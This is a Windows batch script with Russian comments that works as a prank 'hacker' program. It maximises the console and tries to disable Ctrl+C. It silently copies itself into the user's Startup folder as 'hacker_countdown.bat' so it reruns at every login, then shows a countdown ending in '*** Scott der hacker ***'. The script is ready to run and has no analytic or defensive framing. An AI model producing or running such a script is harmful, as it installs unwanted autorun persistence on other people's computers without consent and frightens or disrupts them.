@echo off
:: Запускаем в полноэкранном режиме через PowerShell
mode con: cols=700 lines=300
powershell -windowstyle maximized -command ""

:: Запрет на закрытие
cls
echo SetConsoleCtrlHandler to disable CTRL+C
powershell -command "[console]::TreatControlCAsInput = $true"

:: Копируем себя в автозагрузку
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "me=%~f0"
copy "%me%" "%startup%\hacker_countdown.bat" >nul 2>&1

:: Отсчёт
cls
for /l %%i in (10,-1,0) do (
    cls
    echo.
    echo              Countdown: %%i
    timeout /t 1 >nul
)

:: Сообщение
cls
echo.
echo        *** Scott der hacker ***
pause >nul
